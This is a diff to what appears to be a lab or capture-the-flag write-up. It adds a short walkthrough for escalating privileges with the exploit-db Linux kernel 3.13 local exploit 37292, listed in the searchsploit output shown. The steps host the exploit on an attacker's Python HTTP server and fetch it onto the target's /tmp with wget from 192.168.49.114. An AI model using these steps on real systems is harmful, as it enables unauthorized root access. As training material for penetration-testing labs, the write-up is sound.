@@ -170,5 +170,15 @@ Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14 | linux/local/37292.c
 Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14 | linux/local/37293.txt
 -------------------------------------------- ---------------------------------
 Shellcodes: No Results
+```
+
+# Linux Kernel Exploit
+```python
+1. First we have to download the exploit(https://www.exploit-db.com/exploits/37292)
+2. Now start the python server where you have downloaded the file by the following command: sudo python3 -m http.server 80
+3. find the ip address of your machine by command: ifconfig
+4. Now we download that file to our target machine by moving to /tmp directory, by the following command.(wget http://192.168.49.114/37292.c
+)
 
 ```
+
